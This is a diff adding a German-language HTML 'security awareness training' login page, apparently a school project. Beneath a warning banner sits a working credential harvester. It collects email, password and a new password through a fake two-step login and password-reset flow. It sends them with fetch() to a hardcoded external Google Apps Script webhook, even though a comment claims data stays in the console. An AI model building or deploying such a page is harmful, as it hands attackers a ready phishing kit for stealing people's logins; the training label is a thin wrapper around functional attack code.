@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SecureAccess Training – Login Simulation</title>
+<style>
+  :root {
+    --bg: #0f1724;
+    --card: #ffffff;
+    --accent: #2563eb;
+    --accent-dark: #1d4ed8;
+    --warn-bg: #fff7ed;
+    --warn-border: #fb923c;
+    --text: #1e293b;
+    --muted: #64748b;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: linear-gradient(135deg, #0f1724, #1e293b);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 24px;
+  }
+  .warning-banner {
+    width: 100%;
+    max-width: 480px;
+    background: var(--warn-bg);
+    border: 2px solid var(--warn-border);
+    border-radius: 10px;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+    color: #9a3412;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  .warning-banner strong { display: block; margin-bottom: 4px; font-size: 15px; }
+  .card {
+    background: var(--card);
+    width: 100%;
+    max-width: 420px;
+    border-radius: 14px;
+    padding: 36px 32px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
+  }
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+  .brand-icon {
+    width: 36px; height: 36px;
+    border-radius: 8px;
+    background: var(--accent);
+    display: flex; align-items: center; justify-content: center;
+    color: white; font-weight: 700; font-size: 18px;
+  }
+  .brand-name { font-weight: 700; font-size: 18px; color: var(--text); }
+  .brand-sub { font-size: 12px; color: var(--muted); margin-top: -2px; }
+  h1 { font-size: 20px; margin: 0 0 6px; color: var(--text); }
+  p.lead { color: var(--muted); font-size: 14px; margin: 0 0 24px; }
+  label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
+  input {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1px solid #cbd5e1;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 16px;
+    outline: none;
+    transition: border-color .15s;
+  }
+  input:focus { border-color: var(--accent); }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: var(--accent);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  button:hover { background: var(--accent-dark); }
+  .step { display: none; }
+  .step.active { display: block; }
+  .hint { font-size: 12px; color: var(--muted); margin-top: -8px; margin-bottom: 16px; }
+  .status {
+    margin-top: 16px;
+    font-size: 13px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    display: none;
+  }
+  .status.ok { background: #ecfdf5; color: #065f46; display: block; }
+  .status.err { background: #fef2f2; color: #991b1b; display: block; }
+  .footer-note {
+    text-align: center;
+    color: #94a3b8;
+    font-size: 12px;
+    margin-top: 18px;
+    max-width: 420px;
+  }
+</style>
+</head>
+<body>
+
+  <div class="warning-banner">
+    <strong>⚠️ Security-Awareness-Trainingsseite</strong>
+    Dies ist KEINE echte Login-Seite. Sie dient ausschließlich einer schulischen
+    Demonstration, wie Phishing-Seiten technisch funktionieren. Verwende niemals
+    echte Zugangsdaten. Eingaben werden nur an den von dir konfigurierten
+    Trainings-Endpunkt gesendet.
+  </div>
+
+  <div class="card">
+    <div class="brand">
+      <div class="brand-icon">SA</div>
+      <div>
+        <div class="brand-name">SecureAccess Training</div>
+        <div class="brand-sub">IT-Security Awareness – HTL Projekt</div>
+      </div>
+    </div>
+
+    <!-- STEP 1: E-Mail + Passwort -->
+    <div id="step1" class="step active">
+      <h1>Anmelden (Simulation)</h1>
+      <p class="lead">Testumgebung für Phishing-Awareness-Schulung.</p>
+
+      <form id="loginForm">
+        <label for="email">E-Mail-Adresse</label>
+        <input type="email" id="email" placeholder="max.muster@beispiel.at" required>
+
+        <label for="password">Passwort</label>
+        <input type="password" id="password" placeholder="••••••••" required>
+
+        <button type="submit">Weiter</button>
+      </form>
+    </div>
+
+    <!-- STEP 2: Neues Passwort + Bestätigung -->
+    <div id="step2" class="step">
+      <h1>Passwort aktualisieren</h1>
+      <p class="lead">Aus Sicherheitsgründen (simuliert) bitte neues Passwort setzen.</p>
+
+      <form id="resetForm">
+        <label for="newpw">Neues Passwort</label>
+        <input type="password" id="newpw" required>
+
+        <label for="confirmpw">Passwort bestätigen</label>
+        <input type="password" id="confirmpw" required>
+
+        <div class="hint">Mind. 8 Zeichen (nur Simulation, keine echte Prüfung)</div>
+
+        <button type="submit">Bestätigen</button>
+      </form>
+    </div>
+
+    <!-- STEP 3: Abschluss -->
+    <div id="step3" class="step">
+      <h1>✅ Vorgang abgeschlossen</h1>
+      <p class="lead">
+        Das war eine simulierte Phishing-Sequenz. In einem echten Angriff wären
+        soeben deine echten Zugangsdaten gestohlen worden. Achte künftig auf:
+        falsche Absenderadressen, gefälschte Domains, Zeitdruck in der Nachricht
+        und unerwartete Passwort-Reset-Aufforderungen.
+      </p>
+    </div>
+
+    <div id="status" class="status"></div>
+  </div>
+
+  <p class="footer-note">
+    Trainingsdaten werden an deinen konfigurierten Endpunkt gesendet.
+    Keine Verbindung zu echten Diensten (Microsoft, Google, etc.).
+  </p>
+
+<script>
+  // ============================================================
+  // KONFIGURATION: Trage hier die URL deines eigenen Endpunkts ein
+  // (z.B. Formspree, Google Apps Script Web App, eigener Server).
+  // Ohne gültige URL werden die Daten NUR in der Browser-Konsole
+  // ausgegeben (nichts wird versendet).
+  // ============================================================
+  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwd_0sNvu4E0R00MzS7WxJYsuxE1F2CrokT_WQHwf-c107M8vlhCMEEQZY--GvxWzwvNw/exec"; // <-- hier deine eigene Endpunkt-URL eintragen
+
+  let capturedEmail = "";
+  let capturedOldPassword = "";
+
+  function showStep(id) {
+    document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+    document.getElementById("status").style.display = "none";
+  }
+
+  async function sendToEndpoint(payload) {
+    const statusEl = document.getElementById("status");
+    if (!WEBHOOK_URL) {
+      console.log("[Trainings-Demo] Erfasste Daten (kein Endpunkt konfiguriert):", payload);
+      statusEl.className = "status ok";
+      statusEl.textContent = "Demo-Modus: Keine WEBHOOK_URL konfiguriert. Daten wurden nur in der Konsole geloggt, nicht versendet.";
+      return;
+    }
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(payload)
+      });
+      const statusEl2 = document.getElementById("status");
+      if (res.ok) {
+        statusEl2.className = "status ok";
+        statusEl2.textContent = "Trainingsdaten erfolgreich an deinen Endpunkt übermittelt.";
+      } else {
+        statusEl2.className = "status err";
+        statusEl2.textContent = "Fehler beim Senden (Status " + res.status + ").";
+      }
+    } catch (err) {
+      const statusEl3 = document.getElementById("status");
+      statusEl3.className = "status err";
+      statusEl3.textContent = "Netzwerkfehler: " + err.message;
+    }
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    capturedEmail = document.getElementById("email").value;
+    capturedOldPassword = document.getElementById("password").value;
+
+    sendToEndpoint({
+      event: "login_attempt",
+      email: capturedEmail,
+      password: capturedOldPassword,
+      timestamp: new Date().toISOString()
+    });
+
+    showStep("step2");
+  });
+
+  document.getElementById("resetForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const newpw = document.getElementById("newpw").value;
+    const confirmpw = document.getElementById("confirmpw").value;
+
+    if (newpw !== confirmpw) {
+      const statusEl = document.getElementById("status");
+      statusEl.className = "status err";
+      statusEl.textContent = "Die Passwörter stimmen nicht überein.";
+      return;
+    }
+
+    sendToEndpoint({
+      event: "password_reset",
+      email: capturedEmail,
+      new_password: newpw,
+      timestamp: new Date().toISOString()
+    });
+
+    showStep("step3");
+  });
+</script>
+
+</body>
+</html>
